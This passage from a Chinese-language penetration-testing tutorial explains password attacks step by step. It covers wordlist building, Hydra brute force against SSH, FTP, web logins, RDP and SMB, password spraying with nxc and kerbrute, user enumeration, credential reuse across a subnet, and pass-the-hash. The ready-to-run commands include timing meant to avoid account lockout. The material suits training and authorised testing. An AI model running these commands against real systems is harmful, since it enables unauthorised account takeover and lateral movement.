- 能用常見字典和規則建立有效的候選密碼集。

---

## 理論基礎：攻擊模式對比

| 模式 | 工具 | 目標 | 鎖定風險 |
|------|------|------|---------|
| 離線破解 | hashcat / john | hash 文件 | 無（本地計算） |
| 線上暴力破解 | Hydra / Medusa | 服務登入 | 高（每次請求） |
| 密碼噴灑 | CrackMapExec / kerbrute | 多帳號試少數密碼 | 低（控制頻率） |
| 憑證重用 | CrackMapExec / nxc | 已知密碼試多服務 | 低 |

## 方法一：字典準備

```bash
# 常用字典
ls /usr/share/wordlists/
# rockyou.txt → 最常用（1400萬密碼）
# /usr/share/seclists/ → 各種用途字典集合

# 解壓 rockyou.txt
gunzip /usr/share/wordlists/rockyou.txt.gz
# gunzip → 解壓縮 .gz 檔案

# SecLists 安裝（若沒有）
sudo apt install seclists -y
ls /usr/share/seclists/Passwords/
# Common-Credentials/10-million-password-list-top-10000.txt → 快速試用

# 自製字典（針對目標組織）
cewl http://TARGET_SITE -m 6 -w /tmp/cewl_words.txt
# cewl → 從網站爬取單字建立字典
# -m 6 → 最短 6 個字元
# -w   → 輸出到檔案

# 合併字典
cat /usr/share/wordlists/rockyou.txt /tmp/cewl_words.txt > /tmp/combined.txt
sort -u /tmp/combined.txt -o /tmp/combined.txt
# sort -u → 去重複並排序
# -o      → 輸出到同一個檔案（in-place）

# hashcat 規則（對字典套用常見變形）
ls /usr/share/hashcat/rules/
# best64.rule     → 64 種常見變形（小寫/大寫/數字後綴）
# rockyou-30000.rule → 更多變形
# d3ad0ne.rule    → 激進版

# 用規則展開字典查看
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule /tmp/small_wordlist.txt | head -50
# --stdout → 不破解，只輸出展開後的候選
# 確認規則的效果
```

## 方法二：線上暴力破解（Hydra）

```bash
# SSH 暴力破解
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET_IP ssh
# -l admin → 指定使用者名稱（小寫 l = 單一使用者）
# -L users.txt → 使用者名稱列表（大寫 L = 列表）
# -P password_list → 密碼列表（大寫 P）
# -p password     → 單一密碼（小寫 p）
# ssh             → 目標服務協定

# 加快速度（多執行緒）
hydra -l admin -P rockyou.txt -t 4 TARGET_IP ssh
# -t 4 → 4 個平行執行緒（SSH 不要太多，容易 timeout）

# FTP
hydra -l admin -P rockyou.txt TARGET_IP ftp
# -f → 找到第一個就停止

# HTTP 表單（POST）
hydra -l admin -P rockyou.txt TARGET_IP http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid"
# http-post-form → POST 請求
# /login → 登入 URL
# username=^USER^&password=^PASS^ → POST 參數（^USER^/^PASS^ 是佔位符）
# F=Invalid → 失敗時頁面包含 "Invalid"（F=失敗特徵）

# HTTP Basic Auth
hydra -l admin -P rockyou.txt TARGET_IP http-get /admin
# http-get → HTTP GET（帶 Basic Auth）
# /admin → 路徑

# RDP
hydra -l administrator -P rockyou.txt TARGET_IP rdp
# -t 1 → RDP 建議 1 個執行緒（連線較慢）

# SMB
hydra -l administrator -P rockyou.txt TARGET_IP smb
```

## 方法三：密碼噴灑（Password Spraying）

```bash
# 原理：對多個帳號嘗試少量密碼，避免觸發鎖定
# 鎖定閾值通常是 3-5 次失敗 → 每批只試 2 個密碼

# Windows/AD 環境（CrackMapExec / nxc）
nxc smb DC_IP -u users.txt -p 'Summer2024!'
# -u users.txt → 使用者名稱列表
# -p 'Summer2024!' → 試這一個密碼
# 輸出：[+] 成功 / [-] 失敗

# 找有效帳號（不看密碼，看哪些帳號存在）
nxc smb DC_IP -u users.txt -p 'InvalidPassword123'
# 輸出差異：STATUS_LOGON_FAILURE（帳號存在但密碼錯）
# vs       STATUS_NO_SUCH_USER（帳號不存在）

# Kerberos 噴灑（對 DC 直接測）
kerbrute passwordspray -d DOMAIN.LOCAL --dc DC_IP users.txt 'Summer2024!'
# passwordspray → 密碼噴灑模式
# -d DOMAIN.LOCAL → 目標域
# --dc DC_IP      → DC 的 IP
# users.txt       → 帳號列表
# 'Summer2024!'   → 要試的密碼

# 間隔時間（避免鎖定，等待鎖定計時器重置）
# 若鎖定閾值是 5，每 30 分鐘重置
# 每批噴灑後 sleep 30m
sleep 1800   # 等 30 分鐘
# 1800 秒 = 30 分鐘

# 驗證找到的帳號
nxc smb DC_IP -u user -p 'Summer2024!' --shares
# --shares → 列出可存取的共享（確認憑證有效）
```

## 方法四：憑證重用驗證

```bash
# 在多個服務上驗證同一組憑證
nxc smb 192.168.1.0/24 -u admin -p 'Password123!'
# 對整個網段的 SMB 測同一組憑證
# [+] → 成功（找到可橫向移動的主機）

nxc winrm 192.168.1.0/24 -u admin -p 'Password123!'
# 測 WinRM（5985/5986）

nxc ssh 192.168.1.0/24 -u admin -p 'Password123!'
# 測 SSH

# 若有 hash（PTH）
nxc smb 192.168.1.0/24 -u admin -H 'NTHASH'
# -H → 使用 NT hash 而非密碼

# 測 RDP
nxc rdp TARGET_IP -u admin -p 'Password123!'
# 確認可以 RDP 登入
```

## 速查表

```bash
# SSH 暴力破解
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET_IP ssh -t 4

nxc smb 192.168.1.0/24 -u user -p 'Password123!'

# rockyou.txt 位置
/usr/share/wordlists/rockyou.txt

# hashcat 規則展開預覽
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt | head
```
